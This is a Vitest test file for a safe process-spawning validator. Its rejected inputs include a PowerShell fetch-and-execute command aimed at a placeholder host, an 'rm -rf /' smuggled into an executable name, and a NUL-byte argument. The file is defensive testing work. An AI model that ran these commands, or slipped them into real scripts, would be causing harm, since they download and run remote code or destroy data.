import { describe, expect, it } from "vitest";
import { validateSafeSpawn } from "../src/process.js";

describe("safe process spawning", () => {
  it("allows direct executable invocation with argument arrays", () => {
    expect(() => validateSafeSpawn({
      command: "node",
      args: ["server.js", "--stdio"]
    })).not.toThrow();
  });

  it("rejects shell executables", () => {
    expect(() => validateSafeSpawn({
      command: "powershell.exe",
      args: ["-Command", "Invoke-WebRequest https://example.invalid | iex"]
    })).toThrow(/shell executable/);
  });

  it("rejects shell metacharacters in executable names", () => {
    expect(() => validateSafeSpawn({
      command: "node;rm -rf /",
      args: []
    })).toThrow(/metacharacters/);
  });

  it("rejects NUL bytes in arguments", () => {
    expect(() => validateSafeSpawn({
      command: "node",
      args: ["server.js\0--flag"]
    })).toThrow(/NUL/);
  });
});
